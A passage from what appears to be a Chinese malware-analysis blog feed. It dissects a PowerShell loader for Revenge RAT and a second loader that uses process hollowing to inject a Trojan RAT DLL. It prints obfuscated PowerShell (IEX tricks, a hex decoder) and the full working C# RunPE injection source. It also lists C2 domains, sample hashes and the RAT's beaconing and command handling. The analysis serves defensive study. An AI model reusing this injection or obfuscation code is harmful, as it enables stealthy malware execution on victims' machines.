+[CHar]117  +[CHar]116+  [CHar]112  +[CHar]117  +[CHar]116  +  [CHar]84+  [CHar]121+  [CHar]112+[CHar]101+  [CHar]40+  [CHar]91  +[CHar]98+  [CHar]121  +  [CHar]116+[CHar]101+[CHar]91  +  [CHar]93+[CHar]93  +[CHar]41+  [CHar]93  +[CHar]13  +  [CHar]10+  [CHar]32+  [CHar]32+  [CHar]32  +  [CHar]32  +[CHar]112+[CHar]97  +[CHar]114  +[CHar]97  +[CHar]109  +[CHar]40  +  [CHar]13  +  [CHar]10  +  [CHar]32+  [CHar]32+  [CHar]32+  [CHar]32+[CHar]32  +[CHar]32+[CHar]32  +[CHar]32  +  [CHar]91  +  [CHar]80+[CHar]97+  [CHar]114  +  [CHar]97  +[CHar]109+[CHar]101+  [CHar]116  +[CHar]101  +  [CHar]114+  [CHar]40+[CHar]77+  [CHar]97  +[CHar]110  +[CHar]100+  [CHar]97+[CHar]116  +[CHar]111  +  [CHar]114  +[CHar]121  +[CHar]61+[CHar]36+  [CHar]116+  [CHar]114+[CHar]117+[CHar]101  +  [CHar]41+[CHar]93  +[CHar]32  +  [CHar]91+  [CHar]83  +  [CHar]116  +[CHar]114+[CHar]105  +[CHar]110+[CHar]103  +  [CHar]93+  [CHar]36+[CHar]122+  [CHar]88+[CHar]97+[CHar]87  +  [CHar]86  +  [CHar]80+[CHar]105+  [CHar]13  +[CHar]10  +  [CHar]32  +  [CHar]32  +  [CHar]32+  [CHar]32+  [CHar]41+[CHar]13  +[CHar]10  +[CHar]32+[CHar]32  +  [CHar]32+[CHar]32  +[CHar]36+[CHar]72+[CHar]116  +[CHar]116+[CHar]108  +[CHar]100+  [CHar]120  +[CHar]120  +  [CHar]49+  [CHar]115+  [CHar]49+  [CHar]115  +[CHar]51  +  [CHar]100+  [CHar]52  +  [CHar]102  +  [CHar]53+[CHar]118+  [CHar]53  +  [CHar]32  +  [CHar]61+[CHar]32  +  [CHar]78  +  [CHar]101  +[CHar]119  +[CHar]45+  [CHar]79  +  [CHar]98  +  [CHar]106  +[CHar]101  +  [CHar]99  +[CHar]116+  [CHar]32+[CHar]45+[CHar]84+  [CHar]121  +[CHar]112  +  [CHar]101  +  [CHar]78  +  [CHar]97+[CHar]109+  [CHar]101+  [CHar]32  +[CHar]98+[CHar]121+[CHar]116+[CHar]101+[CHar]91+[CHar]93  +  [CHar]32  +[CHar]45  +  [CHar]65  +[CHar]114+  [CHar]103+[CHar]117+  [CHar]109  +  [CHar]101+[CHar]110  +  [CHar]116+[CHar]76  +[CHar]105+[CHar]115+[CHar]116  +[CHar]32+[CHar]40  +  [CHar]36  +[CHar]122  +[CHar]88+  [CHar]97  +  [CHar]87+[CHar]86+  [CHar]80+  [CHar]105+  [CHar]46  +[CHar]76  +  [CHar]101+[CHar]110+  [CHar]103  +[CHar]116+  [CHar]104  +  [CHar]32  +[CHar]47  +  [CHar]32+  [CHar]50+  [CHar]41  +  [CHar]13  +  [CHar]10+  [CHar]32  +[CHar]32+[CHar]32  +[CHar]32+  [CHar]102+  [CHar]111  +  [CHar]114  +[CHar]32+  [CHar]40+[CHar]36  +[CHar]105  +[CHar]32  +  [CHar]61  +[CHar]32  +  [CHar]48  +  [CHar]59  +[CHar]32+  [CHar]36  +  [CHar]105  +[CHar]32+  [CHar]45+[CHar]108+[CHar]116  +[CHar]32  +  [CHar]36+[CHar]122+  [CHar]88  +  [CHar]97  +  [CHar]87+  [CHar]86+  [CHar]80  +  [CHar]105+  [CHar]46  +[CHar]76  +  [CHar]101  +[CHar]110  +[CHar]103  +[CHar]116  +[CHar]104+[CHar]59+  [CHar]32+  [CHar]36+  [CHar]105+  [CHar]32+[CHar]43  +[CHar]61+[CHar]32  +[CHar]50  +  [CHar]41  +[CHar]32+[CHar]123+  [CHar]13  +[CHar]10+  [CHar]32  +  [CHar]32+[CHar]32+[CHar]32  +[CHar]32  +[CHar]32  +  [CHar]32  +  [CHar]32  +[CHar]36  +  [CHar]72+[CHar]116+[CHar]116  +[CHar]108+  [CHar]100+  [CHar]120+  [CHar]120  +[CHar]49+  [CHar]115+  [CHar]49  +[CHar]115+  [CHar]51  +  [CHar]100+  [CHar]52+[CHar]102  +[CHar]53+  [CHar]118+[CHar]53  +  [CHar]91+[CHar]36  +  [CHar]105+  [CHar]32+  [CHar]47  +[CHar]32+[CHar]50  +[CHar]93  +[CHar]32+  [CHar]61+[CHar]32+[CHar]91  +[CHar]67+  [CHar]111+  [CHar]110  +[CHar]118  +  [CHar]101+[CHar]114+[CHar]116+[CHar]93  +  [CHar]58+[CHar]58  +  [CHar]84  +  [CHar]111  +[CHar]66+[CHar]121  +[CHar]116+[CHar]101+[CHar]40+  [CHar]36  +  [CHar]122  +  [CHar]88  +[CHar]97  +[CHar]87+  [CHar]86  +  [CHar]80+[CHar]105+[CHar]46  +  [CHar]83+  [CHar]117  +  [CHar]98  +[CHar]115  +[CHar]116  +  [CHar]114+  [CHar]105  +[CHar]110  +[CHar]103  +  [CHar]40+  [CHar]36  +  [CHar]105  +[CHar]44+  [CHar]32  +[CHar]50+  [CHar]41+[CHar]44  +[CHar]32  +  [CHar]49  +[CHar]54  +[CHar]41+  [CHar]13  +[CHar]10  +[CHar]32  +  [CHar]32+[CHar]32+[CHar]32  +  [CHar]125  +[CHar]13+  [CHar]10  +  [CHar]13+  [CHar]10+  [CHar]32  +  [CHar]32+[CHar]32  +[CHar]32  +[CHar]114  +  [CHar]101  +[CHar]116+  [CHar]117+[CHar]114+  [CHar]110+[CHar]32+  [CHar]91+  [CHar]98+  [CHar]121  +[CHar]116+  [CHar]101+[CHar]91  +[CHar]93+  [CHar]93  +  [CHar]36+[CHar]72+[CHar]116  +  [CHar]116+  [CHar]108+[CHar]100+[CHar]120  +[CHar]120+[CHar]49+  [CHar]115+  [CHar]49  +[CHar]115+[CHar]51+  [CHar]100+  [CHar]52+  [CHar]102+  [CHar]53+  [CHar]118+  [CHar]53+[CHar]13  +[CHar]10  +  [CHar]125  )# Decode 4Function maxdooom {    [CmdletBinding()]    [OutputType([byte[]])]    param(        [Parameter(Mandatory=$true)] [String]$zXaWVPi    )    $Httldxx1s1s3d4f5v5 = New-Object -TypeName byte[] -ArgumentList ($zXaWVPi.Length / 2)    for ($i = 0; $i -lt $zXaWVPi.Length; $i += 2) {        $Httldxx1s1s3d4f5v5[$i / 2] = [Convert]::ToByte($zXaWVPi.Substring($i, 2), 16)    }    return [byte[]]$Httldxx1s1s3d4f5v5}${\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`}  -&gt; IEX${!!!} -&gt; IEX&amp;( ([sTRIng]$vERbOsepreFERENcE)[1,3]+&#39;x&#39;-jOIN&#39;&#39;) -&gt; IEX</code></pre><p>第一行的混淆最终结果是这样的<br><img src="https://z3.ax1x.com/2021/05/15/g61h8I.png" alt=""></p><p>第四行混淆<br><img src="https://z3.ax1x.com/2021/05/15/g61qaQ.png" alt=""></p><p>第七行混淆<br><img src="https://z3.ax1x.com/2021/05/15/g61jGn.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63prT.png" alt=""></p><p>最终解密得到后的ps1</p><pre><code>sal g $ekltktekdkqjfdkfdkfkdfksdksdkvckkerkewtekrtekyekw0000[String]$CXCXxcxsderrewrttyrghbvvbc=&quot;&lt;BIN_HEX&gt;&quot;Function maxdooom {    [CmdletBinding()]    [OutputType([byte[]])]    param(        [Parameter(Mandatory=$true)] [String]$zXaWVPi    )    $Httldxx1s1s3d4f5v5 = New-Object -TypeName byte[] -ArgumentList ($zXaWVPi.Length / 2)    for ($i = 0; $i -lt $zXaWVPi.Length; $i += 2) {        $Httldxx1s1s3d4f5v5[$i / 2] = [Convert]::ToByte($zXaWVPi.Substring($i, 2), 16)    }    return [byte[]]$Httldxx1s1s3d4f5v5}[String]$Cmder2021=&quot;&lt;BIN_HEX&gt;&quot;</code></pre><h2 id="NET文件"><a href="#NET文件" class="headerlink" title=".NET文件"></a>.NET文件</h2><p>$CXCXxcxsderrewrttyrghbvvbc变量存的PE是Revenge RAT，上次就分析过这里了略过，分析链接：<a href="https://422926799.github.io/posts/43591be7.html">https://422926799.github.io/posts/43591be7.html</a><br><img src="https://z3.ax1x.com/2021/05/15/g63Zxx.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63mM6.png" alt=""></p><p>$Cmder2021变量里的存的PE则是读取资源文件内存加载<br><img src="https://z3.ax1x.com/2021/05/15/g63nsK.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63uqO.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63MZD.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63GRI.png" alt=""></p><p>资源文件<br><img src="https://z3.ax1x.com/2021/05/15/g63Jzt.png" alt=""></p><h2 id="URLS"><a href="#URLS" class="headerlink" title="URLS"></a>URLS</h2><p><a href="http://azulviagens.online" target="_blank" rel="noopener">http://azulviagens.online</a><br>Cdtpitbull.hopto.org</p><h2 id="HASHES"><a href="#HASHES" class="headerlink" title="HASHES"></a>HASHES</h2><p>Initial attack document<br>91611ac2268d9bf7b7cb2e71976c630f6b4bfdbb68774420bf01fd1493ed28c7</p><p>Initial attack document<br>77d6651de47bff4c24fc26fa018ea648b0e14e276e8240fae6b1724b8638c46a</p><p>1.docx(template)<br>338b2d8d76f4028bfbd177127371b2509971606553d606c534316dc40cfa8fb9</p><p>Microsoft_Excel_Macro-Enabled_Worksheet.xlsm<br>32f1a502126b1932e1def04b98d8be235c8d25ef7268f8cb35d460cd073a88b2</p><p>A.txt<br>4b65e5785692950f8100b22f2827d65ba93e99dd717eb444af035e96fcd84763</p><p>opera.ps1<br>03f5ff9b6a6b24f76799cc15fe3f1fbf1ca9d6dda30a4154125ed5dd5834290c</p><p>Revenge RAT<br>73f113a6146224c4a1f92f89055922a28322787c108e30000a0a420fa46ed9e2</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考链接：&lt;a href=&quot;https://www.uptycs.com/blog/revenge-rat-targeting-users-in-south-america&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.uptycs</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>ps1加载Trojan RAT dll分析</title>
    <link href="http://422926799.github.io/posts/43591be7.html"/>
    <id>http://422926799.github.io/posts/43591be7.html</id>
    <published>2021-05-09T05:53:36.000Z</published>
    <updated>2021-05-09T06:49:44.971Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在群里看到个ps1的链接，没事干下载下来分析了一下<br>感觉挺有意思，ps1链接:<a href="https://pastebin.com/raw/7Ze9v4qa" target="_blank" rel="noopener">https://pastebin.com/raw/7Ze9v4qa</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>原ps1内容，一眼看去关键的地方经过了混淆<br><img src="https://z3.ax1x.com/2021/05/09/gJOqZd.png" alt=""></p><p>手动解密，最终得到的内容如下<br><img src="https://z3.ax1x.com/2021/05/09/gJXCLQ.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/05/09/gJX0wd.png" alt=""></p><p>$RUNPE变量是加密的csahrp源码<br>$Bytes是加密的RAT DLL</p><p>该ps1的功能如下:<br>       0.延时1秒</p><pre><code>1. StartupCheck环境变量存在的话写入vbs调用INSTALL函数    * %Startup%环境变量不存在调用CodeDom函数1. CodeDom函数功能    1. 解密gzip压缩的cs源码的内容    2. 利用csc编译成dll    3. 利用InstallUtil.exe调用dll里的Execute函数-&gt;Execute(string path, byte[] payload)加载Trojan RAT dll</code></pre><p>powershell ISE断点分析:<br><img src="https://z3.ax1x.com/2021/05/09/gJXcSf.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJXgl8.png" alt=""></p><p>火绒剑动态运行监控:<br><img src="https://z3.ax1x.com/2021/05/09/gJXROg.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJXfmQ.png" alt=""></p><p>解密出来的cs源码分析：</p><pre><code class="csharp">using System;using System.Diagnostics;using System.Runtime.InteropServices;using Microsoft.VisualBasic;namespace projFUD{    public static class PA    {        public static string ReverseString(string Str)        {            string Revstr = &quot;&quot;;            int Length;            Length = Str.Length - 1;            while (Length &gt;= 0)            {                Revstr = Revstr + Str[Length];                Length--;            }            return Revstr;        }        public static string BinaryToString(string str)        {            string chars = System.Text.RegularExpressions.Regex.Replace(str, &quot;[^01]&quot;, &quot;&quot;);            byte[] arr = new byte[(chars.Length / 8) - 1 + 1];            for (int i = 0; i &lt;= arr.Length - 1; i++)                arr[i] = Convert.ToByte(chars.Substring(i * 8, 8), 2);            return System.Text.ASCIIEncoding.ASCII.GetString(arr);        }        private delegate int DelegateResumeThread(IntPtr handle);        private delegate bool DelegateWow64SetThreadContext(IntPtr thread, int[] context);        private delegate bool DelegateSetThreadContext(IntPtr thread, int[] context);        private delegate bool DelegateWow64GetThreadContext(IntPtr thread, int[] context);        private delegate bool DelegateGetThreadContext(IntPtr thread, int[] context);        private delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);        private delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);        private delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);        private delegate int DelegateZwUnmapViewOfSection(IntPtr process, int baseAddress);        private delegate bool DelegateCreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);        private static string[] AL = Convert.ToString(&quot;0011001000110011011011000110010101101110011100100110010101101011|0110110001101100011001000111010001101110|011001000110000101100101011100100110100001010100011001010110110101110101011100110110010101010010|011101000111100001100101011101000110111001101111010000110110010001100001011001010111001001101000010101000111010001100101010100110011010000110110011101110110111101010111|01110100011110000110010101110100011011100110111101000011011001000110000101100101011100100110100001010100011101000110010101010011|011101000111100001100101011101000110111001101111010000110110010001100001011001010111001001101000010101000111010001100101010001110011010000110110011101110110111101010111|01110100011110000110010101110100011011100110111101000011011001000110000101100101011100100110100001010100011101000110010101000111|0111100001000101011000110110111101101100011011000100000101101100011000010111010101110100011100100110100101010110|011110010111001001101111011011010110010101001101011100110111001101100101011000110110111101110010010100000110010101110100011010010111001001010111|0111100101110010011011110110110101100101010011010111001101110011011001010110001101101111011100100101000001100100011000010110010101010010|0110111001101111011010010111010001100011011001010101001101100110010011110111011101100101011010010101011001110000011000010110110101101110010101010111011101011010|0100000101110011011100110110010101100011011011110111001001010000011001010111010001100001011001010111001001000011|&quot;).Split(new string[] { &quot;|&quot; }, StringSplitOptions.None);        private static string Kernel32 = BinaryToString(AL[0]);        private static string ntdll = BinaryToString(AL[1]);        private static string RsmThread = BinaryToString(AL[2]);        private static string Wow64SetThreadCtx = BinaryToString(AL[3]);        private static string SetThreadCtx = BinaryToString(AL[4]);        private static string Wow64GetThreadCtx = BinaryToString(AL[5]);        private static string GetThreadCtx = BinaryToString(AL[6]);        private static string VirtualAllcEx = BinaryToString(AL[7]);        private static string WriteProcessMem = BinaryToString(AL[8]);        private static string ReadProcessMem = BinaryToString(AL[9]);        private static string ZwUnmapViewOfSec = BinaryToString(AL[10]);        private static string CreateProcA = BinaryToString(AL[11]);        private static readonly DelegateResumeThread ResumeThread = LoadApi&lt;DelegateResumeThread&gt;(ReverseString(Kernel32), ReverseString(RsmThread));        private static readonly DelegateWow64SetThreadContext Wow64SetThreadContext = LoadApi&lt;DelegateWow64SetThreadContext&gt;(ReverseString(Kernel32), ReverseString(Wow64SetThreadCtx));        private static readonly DelegateSetThreadContext SetThreadContext = LoadApi&lt;DelegateSetThreadContext&gt;(ReverseString(Kernel32), ReverseString(SetThreadCtx));        private static readonly DelegateWow64GetThreadContext Wow64GetThreadContext = LoadApi&lt;DelegateWow64GetThreadContext&gt;(ReverseString(Kernel32), ReverseString(Wow64GetThreadCtx));        private static readonly DelegateGetThreadContext GetThreadContext = LoadApi&lt;DelegateGetThreadContext&gt;(ReverseString(Kernel32), ReverseString(GetThreadCtx));        private static readonly DelegateVirtualAllocEx VirtualAllocEx = LoadApi&lt;DelegateVirtualAllocEx&gt;(ReverseString(Kernel32), ReverseString(VirtualAllcEx));        private static readonly DelegateWriteProcessMemory WriteProcessMemory = LoadApi&lt;DelegateWriteProcessMemory&gt;(ReverseString(Kernel32), ReverseString(WriteProcessMem));        private static readonly DelegateReadProcessMemory ReadProcessMemory = LoadApi&lt;DelegateReadProcessMemory&gt;(ReverseString(Kernel32), ReverseString(ReadProcessMem));        private static readonly DelegateZwUnmapViewOfSection ZwUnmapViewOfSection = LoadApi&lt;DelegateZwUnmapViewOfSection&gt;(ReverseString(ntdll), ReverseString(ZwUnmapViewOfSec));        private static readonly DelegateCreateProcessA CreateProcessA = LoadApi&lt;DelegateCreateProcessA&gt;(ReverseString(Kernel32), ReverseString(CreateProcA));        [DllImport(&quot;kernel32&quot;, SetLastError = true)]        private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);        [DllImport(&quot;kernel32&quot;, CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]        private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);        private static CreateApi LoadApi&lt;CreateApi&gt;(string name, string method)        {            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));        }        [StructLayout(LayoutKind.Sequential, Pack = 1)]        private struct ProcessInformation        {            public readonly IntPtr ProcessHandle;            public readonly IntPtr ThreadHandle;            public readonly uint ProcessId;            private readonly uint ThreadId;        }        [StructLayout(LayoutKind.Sequential, Pack = 1)]        private struct StartupInformation        {            public uint Size;            private readonly string Reserved1;            private readonly string Desktop;            private readonly string Title;            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]            private readonly byte[] Misc;            private readonly IntPtr Reserved2;            private readonly IntPtr StdInput;            private readonly IntPtr StdOutput;            private readonly IntPtr StdError;        }        public static void Execute(string path, byte[] payload) //傀儡进程实现        {            for (int i = 0; i &lt; 5; i++)            {                int readWrite = 0;                StartupInformation si = new StartupInformation();                ProcessInformation pi = new ProcessInformation();                si.Size = UInt32.Parse(Marshal.SizeOf(typeof(StartupInformation)).ToString());                string ToInt32 = System.Text.Encoding.Default.GetString(new byte[] { 0x54, 0x6F, 0x49, 0x6E, 0x74, 0x33, 0x32 });                string ToInt16 = System.Text.Encoding.Default.GetString(new byte[] { 0x54, 0x6F, 0x49, 0x6E, 0x74, 0x31, 0x36 });                try                {                    if (!CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 4 | 134217728, IntPtr.Zero, null, ref si, ref pi)) throw new Exception(); //创建进程                    int fileAddress = (int)Interaction.CallByName(typeof(BitConverter).GetMethod(ToInt32), BinaryToString(&quot;010010010110111001110110011011110110101101100101&quot;), CallType.Method, new object[] { null, new object[] { payload, (30 * 2) } });                    int imageBase = (int)Interaction.CallByName(typeof(BitConverter).GetMethod(ToInt32), BinaryToString(&quot;010010010110111001110110011011110110101101100101&quot;), CallType.Method, new object[] { null, new object[] { payload, fileAddress + (26 * 2) } });                    int[] context = new int[Convert.ToInt32(89 + 90)];                    context[0] = 65538;                    if (IntPtr.Size == 4) //如果字节为4位（32位）                    { if (!GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); } //检索指定线程的上下文                    else //64位                    { if (!Wow64GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); } //来检索WOW64线程的上下文                    int ebx = context[(20 + 21)];                    int baseAddress = 0;                    if (!ReadProcessMemory(pi.ProcessHandle, ebx + 8, ref baseAddress, 4, ref readWrite)) throw new Exception(); //读取内存                    if (imageBase == baseAddress)                        if (ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0) throw new Exception();                    int sizeOfImage = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, fileAddress + 80 });                    int sizeOfHeaders = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, fileAddress + 84 });                    bool allowOverride = false;                    int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 12288, 64);                    if (newImageBase == 0) throw new Exception();                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite)) throw new Exception();                    int sectionOffset = fileAddress + 248;                    short numberOfSections = BitConverter.ToInt16(payload, fileAddress + 6);                    for (int I = 0; I &lt; numberOfSections; I++)                    {                        int virtualAddress = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, sectionOffset + 12 });                        int sizeOfRawData = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, sectionOffset + 16 });                        int pointerToRawData = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, sectionOffset + 20 });                        if (sizeOfRawData != 0)                        {                            byte[] sectionData = new byte[sizeOfRawData];                            Buffer.BlockCopy(payload, pointerToRawData, sectionData, 0, sectionData.Length);                            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();                        }                        sectionOffset += 40;                    }                    byte[] GB = BitConverter.GetBytes(newImageBase);                    if (!WriteProcessMemory(pi.ProcessHandle, ebx + 8, GB, 4, ref readWrite)) throw new Exception();                    int addressOfEntryPoint = (int)Interaction.CallByName(typeof(BitConverter).GetMethod(ToInt32), BinaryToString(&quot;010010010110111001110110011011110110101101100101&quot;), CallType.Method, new object[] { null, new object[] { payload, fileAddress + 40 } });                    if (allowOverride) newImageBase = imageBase;                    context[44] = newImageBase + addressOfEntryPoint;                    if (IntPtr.Size == 4)                    {                        var x = SetThreadContext(pi.ThreadHandle, context);                        if (!x)                        {                            throw new Exception();                        }                    }                    else                    {                        var y = Wow64SetThreadContext(pi.ThreadHandle, context);                        if (!y)                        {                            throw new Exception();                        }                    }                    int r = (int)Interaction.CallByName(ResumeThread, BinaryToString(&quot;010010010110111001110110011011110110101101100101&quot;), CallType.Method, new object[] { pi.ThreadHandle });                    if (r == -1 * 1)                    {                        throw new Exception();                    }                }                catch                {                    Process.GetProcessById(Convert.ToInt32(pi.ProcessId)).Kill(); //执行失败的话返回当前进程PID并杀死                    continue;                }                break;            }        }    }}</code></pre><p>cs主要实现傀儡进程，加载Trojan RAT的dll，如果执行失败的话返回当前进程PID并杀死</p><p>Trojan RAT DLL分析:<br>Main函数入口点分析</p><pre><code>1. 延时2.5秒2. 创建flag互斥体    * 创建flag互斥体    * 互斥体创建失败则退出1. 调用PreventSleep.Run()函数 【防止系统在应用程序运行时进入睡眠状态或关闭显示器】2. Application.ApplicationExit （在应用程序即将关闭时发生）-&gt;调用Config.programMutex.ReleaseMutex() 释放互斥锁3. 调用Client.RUN()函数</code></pre><p><img src="https://z3.ax1x.com/2021/05/09/gJXj0J.png" alt=""></p><p>PreventSleep.Run函数<br><img src="https://z3.ax1x.com/2021/05/09/gJji6O.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJjAne.png" alt=""></p><p>Config<br><img src="https://z3.ax1x.com/2021/05/09/gJjK9P.png" alt=""></p><p>Client.RUN函数分析:</p><pre><code>1. 创建多线程调用Client.TcpReceive函数2. 检测Client.isConnected是否为true（默认为False），如果为false释放所有缓冲区。将收集到的系统信息发送到kimjoy.ddns.net，并将Client.isConnected设置为true。创建一个计时器，该计时器在30秒钟后调用Client.Ping函数。然后创建新的缓冲区，如果上述操作失败将Client.isConnected设置为False</code></pre><p><img src="https://z3.ax1x.com/2021/05/09/gJjNhq.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJjDuF.png" alt=""></p><pre><code>1. 进入循环2. 检测socket状态是否为读取状态模式(Client.client.Poll(-1, SelectMode.SelectRead))和获取返回的值(Client.client.Available)是否成功或者连接(!Client.client.Connected)是否成功，如果其中一项失败退出循环3. 指定缓冲区</code></pre><pre><code>byte[] array = new byte[Client.client.Available];Interaction.CallByName(Client.client, &quot;Receive&quot;, CallType.Method, new object[]{    array,    0,    array.Length,    SocketFlags.None}); //连接的Socket上接收数据之前的数据缓冲区，偏移量，大小和套接字标志</code></pre><pre><code>1. 判断缓冲区里是否存在!@#%^NYAN#!@$ （存在!@#%^NYAN#!@$）2. </code></pre><p>接收到发送来的数据后写入缓冲区 Client.memoryStream.Write(array, 0, array.Length);</p><pre><code>    * 存在的话则从MemoryStream解密内容 Array[] array2 = (Array[])Client.PacketFixer(Client.memoryStream.ToArray(), Config.splitter);    * 实例化PacketHandler类 PacketHandler @object = new PacketHandler();        * 线程池实例化PacketHandler.Handler函数 Thread thread = new Thread(new ParameterizedThreadStart(@object.Handler));    * 将缓冲区里的首位字符串传入PacketHandler.Handler函数作为参数，启用线程池 thread.Start(array2[0])    * 释放缓冲区 Client.memoryStream.Dispose()    * 新建缓冲区Client.memoryStream = new MemoryStream();    * 解密后的数组长度不为2则退出循环    * 在将解密数组的1位元素写入新的缓冲区 Client.memoryStream.Write((byte[])array2[1], 0, ((byte[])array2[1]).Length)1. 缓冲区里不存在!@#%^NYAN#!@$* 设置socket连接状态为false并退出循环 Client.isConnected = false;break</code></pre><p><img src="https://z3.ax1x.com/2021/05/09/gJjg41.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJjW36.png" alt=""></p><p>SendInfo函数分析<br>(每个功能都使用config.key进行分割)</p><pre><code>* IdGenerator.GetHardDiskSerialNumber()当前盘符数量* IdGenerator.GetIp()获取当前机器IP* 获取主机名Environment.MachineName和用户名Environment.UserName* IdGenerator.GetCamera()检索捕获驱动程序的版本说明* new ComputerInfo().OSFullName获取系统名称和当前所有进程IdGenerator.GetSystem()* IdGenerator.GetCpu()获取当前CPU名称* ComputerInfo().TotalPhysicalMemory物理内存总量* IdGenerator.GetAV()通过wmic查询检测杀毒* config.port* IdGenerator.GetActiveWindow()获取当前窗口标题* 当前线程区域性的名称CultureInfo.CurrentCulture.Name</code></pre><p><img src="https://z3.ax1x.com/2021/05/09/gJjb4I.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJvSbQ.png" alt=""></p><p>PacketHandler.Handler函数<br>根据解密的数组的0位元素做出对应的判断</p><pre><code>* 如果array[0]==&quot;PNC&quot; ，重置计时器，开始计时，发送PNC字符串给远程服务器* 如果array[0]==&quot;P&quot;，停止计时器，发送P字符串+config.key+Config.stopwatch.ElapsedMilliseconds（计时器的运行时间），并发送W字符串+config.key+当前窗口标题* 如果array[0]==&quot;IE&quot;，打开注册表HKEY_CURRENT_USER\SOFTWARE\RXQLV8XYTDNHNSA\array[1]，如果存在该注册表路径调用Invoke函数（this.Invoke(Config.host, Config.port, array[4], array[5], StringConverter.Encode(StringConverter.Decode(Config.id) + &quot;_&quot; + IdGenerator.GetHardDiskSerialNumber())），并从注册表HKEY_CURRENT_USER\SOFTWARE\RXQLV8XYTDNHNSA\array[1]，读取指定的内容，并将array[1]转换为布尔值，跳转到IL_395，如果注册表路径不存在，发送GPL字符串+config.key+array[5]+key+array[1]+key+false字符串，跳转到IL_395执行* 如果array[0]==&quot;LP&quot;执行invoke函数this.Invoke(Config.host, Config.port, array[1], array[2], StringConverter.Encode(StringConverter.Decode(Config.id) + &quot;_&quot; + IdGenerator.GetHardDiskSerialNumber()), array[3], int.Parse(array[4]), Convert.ToBoolean(array[5]), array[6], Convert.ToBoolean(array[7]))* 如果array[0]==&quot;UNV&quot;调用GetAssembly加载发送来的程序集调用</code></pre><p><img src="https://z3.ax1x.com/2021/05/09/gJvlP1.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJvYrD.png" alt=""><br><img src="https://i.bmp.ovh/imgs/2021/05/020fc9e4e3003092.png" alt=""></p><p>invoke函数<br>bytes=&gt;CreateInstance<br>bytes2=&gt;Start<br>加载对应的程序集调用，创建对应的注册表设置键值<br><img src="https://z3.ax1x.com/2021/05/09/gJxEFA.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJxZWt.png" alt=""></p><p>GetAssembly函数<br>bytes=&gt;SLoad<br>加载程序集之前先base64解码，gzip流解压。在加载<br><img src="https://z3.ax1x.com/2021/05/09/gJxmSP.png" alt=""></p><p>微步情报<br><img src="https://z3.ax1x.com/2021/05/09/gYSBGR.png" alt=""></p><p>请求信息<br><img src="https://z3.ax1x.com/2021/05/09/gYpaOf.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在群里看到个ps1的链接，没事干下载下来分析了一下&lt;br&gt;感觉挺有意思，ps1链接:&lt;a href=&quot;https://pastebin.co</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>windows缓冲区溢出学习</title>
    <link href="http://422926799.github.io/posts/ee8c55e.html"/>
    <id>http://422926799.github.io/posts/ee8c55e.html</id>
    <published>2021-05-07T12:50:23.000Z</published>
    <updated>2021-05-07T13:08:48.032Z</updated>
    
